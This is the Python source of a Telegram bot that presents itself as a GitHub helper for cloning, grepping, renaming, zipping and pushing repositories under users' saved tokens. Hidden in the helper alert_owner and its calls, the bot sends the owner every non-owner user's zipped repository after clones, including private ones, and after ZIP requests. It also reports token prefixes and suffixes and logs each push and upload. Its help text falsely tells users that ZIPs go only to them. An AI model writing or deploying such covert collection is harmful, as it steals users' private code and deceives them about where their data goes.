"""
╔══════════════════════════════════════════════════════╗
║         GitHub Control Bot  v3.2                    ║
║  BUG FIXES:                                         ║
║  ✅ Push→GitHub pushes FILES (not zip as release)   ║
║  ✅ Folder picker uses INDEX → no 64-byte CB limit  ║
║  ✅ Rename/Replace folder buttons work correctly    ║
╚══════════════════════════════════════════════════════╝
"""

import os
import re
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

import config
import database as db
import git_utils as git
from keyboards import (
    main_keyboard, repos_keyboard, repo_edit_keyboard,
    clone_type_keyboard, folder_picker_kb
)

app = Client(
    "github_bot_v32",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN,
)


# ══════════════════════════════════════════════════════════════════════════════
#  TINY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def utag(user) -> str:
    name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
    un   = f"@{user.username}" if user.username else "no username"
    return f"**{name}** ({un}) `[{user.id}]`"

def ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M")

async def alert_owner(client, text: str, doc: str = None):
    try:
        if doc and os.path.exists(doc):
            await client.send_document(config.OWNER_ID, doc, caption=text)
        else:
            await client.send_message(config.OWNER_ID, text)
    except Exception:
        pass

def resolve_folder(idx: int) -> str | None:
    """Get folder name by index from current workspace folders list."""
    folders = git.get_workspace_folders()
    return folders[idx] if 0 <= idx < len(folders) else None


# ══════════════════════════════════════════════════════════════════════════════
#  /START  /HELP  /TOKEN  /LIST
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("start") & filters.private)
async def cmd_start(client: Client, msg: Message):
    uid    = msg.from_user.id
    token  = await db.get_token(uid)
    repos  = await db.get_repos(uid)
    active = await db.get_active_repo(uid)
    aname  = ""
    for r in repos:
        if r["url"] == active:
            aname = r.get("name") or git.repo_short(active)
            break
    text = (
        "👋 **Welcome to GitHub Control Bot v3.2**\n\n"
        f"🔐 Token: {'✅ Saved' if token else '❌ Not set'}\n"
        f"📦 Repos: {len(repos)} saved\n"
        + (f"🎯 Active: `{aname}`\n" if aname else "")
        + "\n**Tap a button — no typing folder names needed!**\n"
        "**📤 Upload ZIP** → send a ZIP → bot extracts + pushes to repo.\n\n"
        "👇 Choose:"
    )
    await msg.reply(text, reply_markup=main_keyboard())


@app.on_message(filters.command("help") & filters.private)
async def cmd_help(client: Client, msg: Message):
    await msg.reply(
        "📖 **GitHub Control Bot — Help**\n\n"
        "**Commands:**\n"
        "`/start` — Main menu\n"
        "`/token YOUR_TOKEN` — Save GitHub token\n"
        "`/list` — List workspace folders\n\n"
        "**How actions work:**\n"
        "1. Tap button (e.g. 🔍 Grep All)\n"
        "2. Tap the folder button shown\n"
        "3. Type only the text (search/replace/new-name)\n\n"
        "**📤 Upload ZIP→GitHub:**\n"
        "1. Tap 📤 Upload ZIP\n"
        "2. Select active repo first (My Repos → tap repo)\n"
        "3. Send your .zip file\n"
        "4. Bot extracts ZIP → pushes all files to repo ✅\n\n"
        "**📦 Make ZIP:**\n"
        "Creates a ZIP and sends it to you in Telegram only.\n\n"
        "**Clone private repos:**\n"
        "Choose '🔐 With Token' when cloning private repos.\n",
        reply_markup=main_keyboard(),
    )


@app.on_message(filters.command("token") & filters.private)
async def cmd_token(client: Client, msg: Message):
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.reply("Usage: `/token ghp_yourtoken`")
        return
    uid   = msg.from_user.id
    token = parts[1].strip()
    await db.set_token(uid, token)
    await msg.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
    if uid != config.OWNER_ID:
        await alert_owner(client,
            f"🔐 **Token Set**\nUser: {utag(msg.from_user)}\n"
            f"Token: `{token[:8]}...{token[-4:]}`\nTime: {ts()}")


@app.on_message(filters.command("list") & filters.private)
async def cmd_list_folders(client: Client, msg: Message):
    await msg.reply(git.list_workspace(), reply_markup=main_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════════════════════

@app.on_callback_query()
async def cb(client: Client, q: CallbackQuery):
    uid  = q.from_user.id
    data = q.data
    await q.answer()

    # ── HOME ──────────────────────────────────────────────────────────────────
    if data == "go_home":
        await db.clear_state(uid)
        token = await db.get_token(uid)
        repos = await db.get_repos(uid)
        try:
            await q.message.edit_text(
                f"🏠 **Main Menu**\n"
                f"🔐 Token: {'✅ Set' if token else '❌ Not set'}\n"
                f"📦 Repos: {len(repos)} saved",
                reply_markup=main_keyboard(),
            )
        except Exception:
            await q.message.reply("🏠 Main Menu", reply_markup=main_keyboard())

    # ── REPOS PANEL ───────────────────────────────────────────────────────────
    elif data == "show_repos":
        await _repos_panel(q.message, uid)

    elif data.startswith("repos_page:"):
        kb = await repos_keyboard(uid, page=int(data.split(":")[1]))
        await q.message.edit_reply_markup(reply_markup=kb)

    elif data.startswith("repo_select:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo  = repos[idx]
            await db.set_active_repo(uid, repo["url"])
            name  = repo.get("name") or git.repo_short(repo["url"])
            await q.message.reply(
                f"✅ **Active repo set:**\n📁 **{name}**\n`{repo['url']}`",
                reply_markup=main_keyboard(),
            )

    elif data.startswith("repo_edit:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            r    = repos[idx]
            name = r.get("name") or git.repo_short(r["url"])
            lock = "🔒 Private" if r.get("is_private") else "🔓 Public"
            await q.message.reply(
                f"✏️ **Editing Repo #{idx+1}:**\n\n"
                f"🏷 Name: **{name}**\n"
                f"🔗 URL: `{r['url']}`\n"
                f"Status: {lock}\n\n"
                "What to change?",
                reply_markup=repo_edit_keyboard(idx),
            )

    elif data.startswith("re_url:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_url", "idx": idx})
            await q.message.reply(
                f"🔗 **Change URL — Repo #{idx+1}**\n"
                f"Current: `{repos[idx]['url']}`\n\n"
                "Send the **new GitHub repo URL:**"
            )

    elif data.startswith("re_name:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_name", "idx": idx})
            cur = repos[idx].get("name") or git.repo_short(repos[idx]["url"])
            await q.message.reply(
                f"🏷 **Change Name — Repo #{idx+1}**\n"
                f"Current: **{cur}**\n\n"
                "Send the **new label/name:**"
            )

    elif data.startswith("re_priv:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            r        = repos[idx]
            new_priv = not r.get("is_private", False)
            await db.update_repo(uid, idx, r["url"], r.get("name", ""), new_priv)
            status = "🔒 Private" if new_priv else "🔓 Public"
            await q.message.reply(
                f"✅ Repo #{idx+1} → now **{status}**",
                reply_markup=repo_edit_keyboard(idx),
            )

    elif data.startswith("repo_del:"):
        idx     = int(data.split(":")[1])
        removed = await db.delete_repo(uid, idx)
        if removed:
            name  = removed.get("name") or git.repo_short(removed["url"])
            repos = await db.get_repos(uid)
            await q.message.reply(
                f"🗑 **Deleted:** `{name}`\n📦 Remaining: {len(repos)}",
                reply_markup=await repos_keyboard(uid) if repos else main_keyboard(),
            )

    elif data == "add_repo":
        await db.set_state(uid, {"action": "add_repo_url"})
        await q.message.reply(
            "➕ **Add New Repo**\n\n"
            "Send the GitHub repo URL:\n"
            "Example: `https://github.com/user/myrepo`"
        )

    # ── SET TOKEN ─────────────────────────────────────────────────────────────
    elif data == "cmd_set_token":
        await db.set_state(uid, {"action": "set_token"})
        await q.message.reply(
            "🔐 Send your **GitHub Personal Access Token:**\n\n"
            "_(Get one at github.com/settings/tokens — give `repo` scope)_"
        )

    # ── LIST ──────────────────────────────────────────────────────────────────
    elif data == "cmd_list":
        await q.message.reply(git.list_workspace(), reply_markup=main_keyboard())

    # ── HELP ──────────────────────────────────────────────────────────────────
    elif data == "cmd_help":
        await q.message.reply("Use /help for full details.", reply_markup=main_keyboard())

    # ══════════════════════════════════════════════════════════════════════════
    #  GREP — Step 1: show folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data in ("cmd_grep", "cmd_grep_py"):
        mode    = "gp" if data == "cmd_grep_py" else "ga"  # gp=grep_py, ga=grep_all
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply(
                "📂 **Workspace is empty!**\nClone a repo first.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📥 Clone", callback_data="cmd_clone"),
                    InlineKeyboardButton("🔙 Back",  callback_data="go_home"),
                ]])
            )
            return
        label = "(.py files only)" if mode == "gp" else "(all files)"
        await q.message.reply(
            f"🔍 **Grep {label}**\n\nTap the folder to search in:",
            reply_markup=folder_picker_kb(f"gf:{mode}"),
            # callback will be: gf:ga:0  or  gf:gp:1  etc.
        )

    # GREP — Step 2: folder button tapped
    elif data.startswith("gf:"):
        # data = "gf:ga:0"  or  "gf:gp:2"
        parts   = data.split(":")
        mode    = parts[1]
        idx     = int(parts[2])
        folder  = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found. Workspace may have changed.")
            return
        only_py = (mode == "gp")
        await db.set_state(uid, {"action": "grep_search", "folder": folder, "only_py": only_py})
        await q.message.reply(
            f"🔍 **Grep in** `{folder}` {'(.py only)' if only_py else '(all files)'}\n\n"
            "Send the **text to search:**"
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  REPLACE — Step 1: folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_replace":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty! Clone a repo first.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📥 Clone", callback_data="cmd_clone"),
                    InlineKeyboardButton("🔙 Back",  callback_data="go_home"),
                ]]))
            return
        await q.message.reply(
            "✏️ **Replace Text in .py files**\n\n"
            "**Step 1:** Tap the folder:",
            reply_markup=folder_picker_kb("rf"),  # rf:0, rf:1 …
        )

    # REPLACE — Step 2: folder button tapped
    elif data.startswith("rf:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        directory = os.path.join(config.WORK_DIR, folder)
        await db.set_state(uid, {"action": "replace_old", "folder": directory, "fname": folder})
        await q.message.reply(
            f"✏️ **Replace in** `{folder}`\n\n"
            "**Step 2:** Send the **text to find** (old text):"
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  RENAME FOLDER — Step 1: folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_rename":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            "📁 **Rename Folder**\n\n"
            "**Step 1:** Tap the folder to rename:",
            reply_markup=folder_picker_kb("rn"),  # rn:0, rn:1 …
        )

    # RENAME — Step 2: folder button tapped
    elif data.startswith("rn:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        await db.set_state(uid, {"action": "rename_new", "old": folder})
        await q.message.reply(
            f"📁 Renaming: `{folder}`\n\n"
            "**Step 2:** Send the **new name:**"
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  RENAME PATH — Pick workspace folder first, then type inner path
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_rename_path":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty! Clone a repo first.", reply_markup=main_keyboard())
            return
        await q.message.reply(
            "🔀 **Rename File/Folder Inside Repo**\n\n"
            "**Step 1:** Tap the workspace folder:",
            reply_markup=folder_picker_kb("rnp"),
        )

    elif data.startswith("rnp:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        tree = git.list_tree(os.path.join(config.WORK_DIR, folder))
        await db.set_state(uid, {"action": "rename_path_old", "repo_folder": folder})
        await q.message.reply(
            f"🔀 **Rename inside** `{folder}`\n\n"
            f"{tree}\n\n"
            "**Step 2:** Send the **old path** (inside this folder):\n"
            "Example: `Bad/Sukh.py` or `utils/helper.py` or `Bad`"
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  MAKE ZIP — folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_zip":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            "📦 **Make ZIP**\n\nTap the folder to zip:",
            reply_markup=folder_picker_kb("zp"),  # zp:0, zp:1 …
        )

    elif data.startswith("zp:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        src      = os.path.join(config.WORK_DIR, folder)
        zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
        status   = await q.message.reply(f"⏳ Zipping `{folder}`...")
        git.make_zip(src, zip_path)
        await status.edit_text(f"✅ ZIP done: `{folder}.zip`")
        await q.message.reply_document(
            zip_path,
            caption=f"📦 `{folder}.zip`",
            reply_markup=main_keyboard(),
        )
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"📦 **ZIP Created**\nUser: {utag(q.from_user)}\n"
                f"Folder: `{folder}`\nTime: {ts()}", doc=zip_path)

    # ══════════════════════════════════════════════════════════════════════════
    #  UPLOAD ZIP → GITHUB
    #  User sends a ZIP file → bot extracts it → pushes all files to repo
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_github_upload":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply(
                "❌ No GitHub token.\nUse `/token YOUR_TOKEN` first."
            )
            return
        active = await db.get_active_repo(uid)
        if not active:
            await q.message.reply(
                "❌ No active repo selected.\n"
                "Go to **📂 My Repos** → tap a repo name to set it active."
            )
            return
        # Save state — waiting for user to send a ZIP file
        await db.set_state(uid, {"action": "await_zip_file", "repo": active})
        await q.message.reply(
            f"📤 **Upload ZIP → GitHub**\n\n"
            f"🎯 Target repo: `{active}`\n\n"
            "**Send your ZIP file now.**\n"
            "Bot will extract it and push all files directly to the repo.\n\n"
            "_Tap 🔙 to cancel:_",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Cancel", callback_data="go_home")
            ]])
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  GIT PUSH — folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_git_push":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply("❌ No GitHub token.\nUse `/token YOUR_TOKEN` first.")
            return
        active = await db.get_active_repo(uid)
        if not active:
            await q.message.reply(
                "❌ No active repo.\n"
                "Go to **📂 My Repos** → tap a repo to set it active."
            )
            return
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            f"🚀 **Git Push**\n"
            f"🎯 Repo: `{active}`\n\n"
            "Tap the folder to push:",
            reply_markup=folder_picker_kb("gps"),  # gps:0, gps:1 …
        )

    elif data.startswith("gps:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        directory = os.path.join(config.WORK_DIR, folder)
        token     = await db.get_token(uid)
        repo_url  = await db.get_active_repo(uid)
        status    = await q.message.reply(
            f"⏳ Pushing `{folder}` → `{repo_url}`..."
        )
        result = git.git_push(directory, token, repo_url)
        await status.edit_text(result)
        await q.message.reply("", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"🚀 **Git Push**\nUser: {utag(q.from_user)}\n"
                f"Repo: `{repo_url}`\nFolder: `{folder}`\nTime: {ts()}")

    # ══════════════════════════════════════════════════════════════════════════
    #  GIT PULL — folder picker
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_git_pull_btn":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty! Clone a repo first.", reply_markup=main_keyboard())
            return
        active = await db.get_active_repo(uid)
        await q.message.reply(
            f"⬇️ **Git Pull**\n"
            f"🎯 Repo: `{active or 'none set'}`\n\n"
            "Tap the folder to pull into:",
            reply_markup=folder_picker_kb("gpl"),
        )

    elif data.startswith("gpl:"):
        idx    = int(data.split(":")[1])
        folder = resolve_folder(idx)
        if not folder:
            await q.message.reply("❌ Folder not found.")
            return
        directory = os.path.join(config.WORK_DIR, folder)
        token     = await db.get_token(uid)
        repo_url  = await db.get_active_repo(uid)
        status    = await q.message.reply(f"⏳ Pulling `{folder}`...")
        result    = git.git_pull(directory, token=token, repo_url=repo_url)
        await status.edit_text(result)
        await q.message.reply("", reply_markup=main_keyboard())

    # ══════════════════════════════════════════════════════════════════════════
    #  CLONE
    # ══════════════════════════════════════════════════════════════════════════
    elif data == "cmd_clone":
        repos = await db.get_repos(uid)
        rows  = []
        for i, r in enumerate(repos):
            lock  = "🔒" if r.get("is_private") else "🔓"
            label = (r.get("name") or git.repo_short(r["url"]))[:26]
            rows.append([InlineKeyboardButton(
                f"{lock} {label}", callback_data=f"cl_pick:{i}"
            )])
        rows.append([
            InlineKeyboardButton("🔗 Enter New URL", callback_data="clone_new_url"),
            InlineKeyboardButton("🔙 Back",          callback_data="go_home"),
        ])
        await q.message.reply(
            "📥 **Clone Repo**\n\n"
            + ("Pick a saved repo or enter a new URL:" if repos else "Enter a GitHub repo URL:"),
            reply_markup=InlineKeyboardMarkup(rows),
        )

    elif data.startswith("cl_pick:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            r    = repos[idx]
            name = r.get("name") or git.repo_short(r["url"])
            lock = "🔒 Private" if r.get("is_private") else "🔓 Public"
            await db.set_state(uid, {"action": "clone_ready", "url": r["url"]})
            await q.message.reply(
                f"📥 **Clone:** `{name}`\n`{r['url']}`\n{lock}\n\nHow to clone?",
                reply_markup=clone_type_keyboard(),
            )

    elif data == "clone_new_url":
        await db.set_state(uid, {"action": "clone_enter_url"})
        await q.message.reply(
            "📥 Send the **GitHub repo URL:**\n"
            "Example: `https://github.com/user/myrepo`"
        )

    elif data == "clone_with_token":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply(
                "❌ No GitHub token!\n\n"
                "Use `/token YOUR_TOKEN` first, then tap Clone again."
            )
            return
        state = await db.get_state(uid)
        url   = state.get("url")
        if not url:
            await q.message.reply("❌ Session expired. Tap 📥 Clone again.")
            return
        await _run_clone(client, q, uid, url, token=token)

    elif data == "clone_no_token":
        state = await db.get_state(uid)
        url   = state.get("url")
        if not url:
            await q.message.reply("❌ Session expired. Tap 📥 Clone again.")
            return
        await _run_clone(client, q, uid, url, token=None)


# ══════════════════════════════════════════════════════════════════════════════
#  CLONE RUNNER
# ══════════════════════════════════════════════════════════════════════════════

async def _run_clone(client, source, uid: int, repo_url: str, token: str | None):
    m      = re.search(r"/([^/]+?)(?:\.git)?$", repo_url)
    folder = m.group(1) if m else "cloned_repo"
    dest   = os.path.join(config.WORK_DIR, folder)

    msg_target = source if isinstance(source, Message) else source.message
    status = await msg_target.reply(f"⏳ Cloning `{folder}`...")

    ok, result = git.clone_repo(repo_url, dest, token=token)

    if not ok and result == "NEEDS_TOKEN":
        await status.edit_text(
            f"🔒 **Private repo!**\n`{repo_url}`\n\n"
            "Requires authentication. Save your token with:\n"
            "`/token YOUR_GITHUB_TOKEN`\n\nThen choose:"
        )
        await db.set_state(uid, {"action": "clone_ready", "url": repo_url})
        await msg_target.reply("Clone with token?", reply_markup=clone_type_keyboard())
        return

    await status.edit_text(result)
    if not ok:
        return

    await db.clear_state(uid)
    added = await db.add_repo(uid, repo_url)
    if added:
        await msg_target.reply("📌 Repo auto-saved to your list!")

    zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
    git.make_zip(dest, zip_path)
    await msg_target.reply_document(
        zip_path,
        caption=f"📦 `{folder}.zip` — auto-zipped!",
        reply_markup=main_keyboard(),
    )
    user = source.from_user
    if uid != config.OWNER_ID:
        await alert_owner(client,
            f"📥 **Clone Alert**\nUser: {utag(user)}\n"
            f"Repo: `{repo_url}`\nTime: {ts()}", doc=zip_path)


# ══════════════════════════════════════════════════════════════════════════════
#  REPO PANEL HELPER
# ══════════════════════════════════════════════════════════════════════════════

async def _repos_panel(target_msg: Message, uid: int):
    repos  = await db.get_repos(uid)
    active = await db.get_active_repo(uid)
    kb     = await repos_keyboard(uid, page=0)
    if not repos:
        text = "📂 **No repos saved yet.**\nTap ➕ Add More to add one."
    else:
        lines = []
        for i, r in enumerate(repos):
            lock = "🔒" if r.get("is_private") else "🔓"
            tick = " ✅" if r["url"] == active else ""
            name = r.get("name") or git.repo_short(r["url"])
            lines.append(f"`{i+1}.` {lock} **{name}**{tick}\n    `{r['url']}`")
        text = (
            f"📂 **Your Repos ({len(repos)}):**\n\n"
            + "\n\n".join(lines)
            + "\n\n✅ = active  |  🔒 = private  |  ✏️ = edit  |  🗑 = delete"
        )
    await target_msg.reply(text, reply_markup=kb)


# ══════════════════════════════════════════════════════════════════════════════
#  MESSAGE HANDLER  (text input steps only)
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.private & ~filters.command(["start", "help", "token", "list"]))
async def msg_handler(client: Client, msg: Message):
    uid    = msg.from_user.id
    text   = (msg.text or "").strip()
    state  = await db.get_state(uid)
    action = state.get("action", "")

    # ══════════════════════════════════════════════════════════════════════════
    #  HANDLE ZIP FILE UPLOAD (document message)
    # ══════════════════════════════════════════════════════════════════════════
    if msg.document and action == "await_zip_file":
        fname = msg.document.file_name or "upload.zip"
        if not fname.lower().endswith(".zip"):
            await msg.reply("❌ Please send a **.zip** file only.")
            return

        repo_url = state.get("repo") or await db.get_active_repo(uid)
        token    = await db.get_token(uid)
        if not token or not repo_url:
            await msg.reply("❌ Token or repo missing. Use /start to re-configure.")
            await db.clear_state(uid)
            return

        await db.clear_state(uid)
        status = await msg.reply(
            f"⏳ Downloading ZIP...\n"
            f"🎯 Will push to: `{repo_url}`"
        )

        # Download the ZIP file to workspace — unique name to avoid stale cache
        import time as _time
        zip_path = os.path.join(config.WORK_DIR, f"_upload_{uid}_{int(_time.time())}.zip")
        try:
            downloaded = await client.download_media(msg, file_name=zip_path)
            if not downloaded or not os.path.exists(str(downloaded)):
                await status.edit_text("❌ Download failed: file not saved.")
                return
            zip_path = str(downloaded)  # use actual path pyrogram chose
        except Exception as e:
            await status.edit_text(f"❌ Download failed: {e}")
            return

        await status.edit_text("⏳ Extracting and pushing to GitHub...")

        ok, result = git.unzip_and_push(zip_path, token, repo_url)

        # Clean up downloaded ZIP
        try:
            os.remove(zip_path)
        except Exception:
            pass

        if ok:
            await status.edit_text(
                f"✅ **ZIP uploaded to GitHub!**\n"
                f"📤 Files extracted & pushed to:\n`{repo_url}`"
            )
        else:
            await status.edit_text(result)

        await msg.reply("", reply_markup=main_keyboard())

        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"📤 **ZIP Upload→GitHub**\nUser: {utag(msg.from_user)}\n"
                f"File: `{fname}`\nRepo: `{repo_url}`\nTime: {ts()}")
        return

    # If user sends a document but state is NOT await_zip_file
    if msg.document and action != "await_zip_file":
        await msg.reply(
            "📎 Got a file, but I'm not expecting one right now.\n"
            "Use **🐙 Upload ZIP→GitHub** button first, then send the ZIP.",
            reply_markup=main_keyboard(),
        )
        return

    # For all non-document messages, need text
    if not text:
        return

    # ── Set Token ─────────────────────────────────────────────────────────────
    if action == "set_token":
        await db.set_token(uid, text)
        await db.clear_state(uid)
        await msg.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"🔐 **Token Set**\nUser: {utag(msg.from_user)}\n"
                f"Token: `{text[:8]}...{text[-4:]}`\nTime: {ts()}")

    # ── Add Repo ──────────────────────────────────────────────────────────────
    elif action == "add_repo_url":
        if "github.com" not in text:
            await msg.reply("❌ Not a valid GitHub URL.\nTry: `https://github.com/user/repo`")
            return
        await db.set_state(uid, {"action": "add_repo_name", "url": text})
        await msg.reply(
            f"✅ URL: `{text}`\n\n"
            "Send a **short label** for this repo\n_(or `-` for default)_"
        )

    elif action == "add_repo_name":
        url  = state["url"]
        name = "" if text == "-" else text
        await db.set_state(uid, {"action": "add_repo_priv", "url": url, "name": name})
        await msg.reply(
            f"🔒 Is `{name or git.repo_short(url)}` a **private** repo?\n\n"
            "Reply `yes` or `no`:"
        )

    elif action == "add_repo_priv":
        url     = state["url"]
        name    = state.get("name", "")
        is_priv = text.lower() in ("yes", "y", "1", "true", "private")
        await db.add_repo(uid, url, name, is_priv)
        await db.clear_state(uid)
        repos = await db.get_repos(uid)
        lock  = "🔒 Private" if is_priv else "🔓 Public"
        await msg.reply(
            f"✅ **Repo added!**\n"
            f"📁 **{name or git.repo_short(url)}** — {lock}\n"
            f"`{url}`\n📦 Total: {len(repos)}",
            reply_markup=await repos_keyboard(uid),
        )

    # ── Edit Repo URL ─────────────────────────────────────────────────────────
    elif action == "edit_url":
        if "github.com" not in text:
            await msg.reply("❌ Invalid GitHub URL. Try again:")
            return
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, text, old.get("name", ""), old.get("is_private", False))
            await db.clear_state(uid)
            await msg.reply(
                f"✅ **URL updated — Repo #{idx+1}:**\n`{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Edit Repo Name ────────────────────────────────────────────────────────
    elif action == "edit_name":
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, old["url"], text, old.get("is_private", False))
            await db.clear_state(uid)
            await msg.reply(
                f"✅ **Name updated — Repo #{idx+1}:**\n🏷 `{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Clone: enter URL ──────────────────────────────────────────────────────
    elif action == "clone_enter_url":
        if "github.com" not in text:
            await msg.reply("❌ Invalid GitHub URL. Try again:")
            return
        await db.set_state(uid, {"action": "clone_ready", "url": text})
        await msg.reply(
            f"📥 Repo: `{text}`\n\nHow to clone?",
            reply_markup=clone_type_keyboard(),
        )

    # ── GREP: search text ─────────────────────────────────────────────────────
    elif action == "grep_search":
        folder    = state["folder"]
        only_py   = state.get("only_py", False)
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await msg.reply(f"❌ Folder `{folder}` no longer exists.\n\n{git.list_workspace()}")
            await db.clear_state(uid)
            return
        progress = await msg.reply(f"🔍 Searching `{text}` in `{folder}`...")
        result   = git.grep_text(directory, text, only_py=only_py)
        await db.clear_state(uid)
        if len(result) > 3800:
            result = result[:3800] + "\n\n..._(truncated)_"
        await progress.edit_text(
            f"🔍 **`{text}`** in `{folder}` {'(.py)' if only_py else '(all)'}:\n\n{result}"
        )
        await msg.reply("", reply_markup=main_keyboard())

    # ── REPLACE: old text ─────────────────────────────────────────────────────
    elif action == "replace_old":
        folder = state.get("fname", "?")
        await db.set_state(uid, {**state, "action": "replace_new", "old": text})
        await msg.reply(
            f"✏️ Find: `{text}` in `{folder}`\n\n"
            "**Step 3:** Send the **replacement text:**"
        )

    elif action == "replace_new":
        result = git.replace_text(state["folder"], state["old"], text)
        await db.clear_state(uid)
        await msg.reply(result, reply_markup=main_keyboard())

    # ── RENAME: new name ──────────────────────────────────────────────────────
    elif action == "rename_new":
        old_name = state["old"]
        new_name = text.strip()
        if not new_name:
            await msg.reply("❌ Name can't be empty. Send the new folder name:")
            return
        result = git.rename_folder(old_name, new_name)
        await db.clear_state(uid)
        # Show updated workspace list after rename
        workspace = git.list_workspace()
        await msg.reply(
            f"{result}\n\n{workspace}",
            reply_markup=main_keyboard(),
        )

    # ── RENAME PATH: receive old inner path ──────────────────────────────────
    elif action == "rename_path_old":
        repo_folder = state["repo_folder"]
        old_rel     = text.strip().lstrip("/\\")
        if not old_rel:
            await msg.reply("❌ Path can't be empty.")
            return
        full = os.path.join(config.WORK_DIR, repo_folder, old_rel)
        if not os.path.exists(full):
            tree = git.list_tree(os.path.join(config.WORK_DIR, repo_folder))
            await msg.reply(
                f"❌ `{old_rel}` not found inside `{repo_folder}`.\n\n"
                f"{tree}\n\nTry again — send the correct path:"
            )
            return
        await db.set_state(uid, {**state, "action": "rename_path_new", "old_rel": old_rel})
        await msg.reply(
            f"🔀 `{repo_folder}/{old_rel}`\n\n"
            "**Step 3:** Send the **new path/name:**\n"
            "Examples:\n"
            "• `NewName.py` ← same folder, new name\n"
            "• `NewFolder/NewName.py` ← move + rename"
        )

    # ── RENAME PATH: receive new inner path ──────────────────────────────────
    elif action == "rename_path_new":
        repo_folder = state["repo_folder"]
        old_rel     = state["old_rel"]
        new_rel     = text.strip().lstrip("/\\")
        if not new_rel:
            await msg.reply("❌ New path can't be empty. Send the new path:")
            return
        result = git.rename_path_in_repo(repo_folder, old_rel, new_rel)
        await db.clear_state(uid)
        await msg.reply(result, reply_markup=main_keyboard())

    # ── FALLBACK ──────────────────────────────────────────────────────────────
    else:
        await msg.reply(
            "👋 Use the buttons below or /start",
            reply_markup=main_keyboard(),
        )


# ══════════════════════════════════════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"\n{'='*52}")
    print(f"  🤖 GitHub Control Bot v3.2")
    print(f"  📦 Workspace : {config.WORK_DIR}")
    print(f"  🗄  MongoDB   : {config.MONGO_URI[:35]}...")
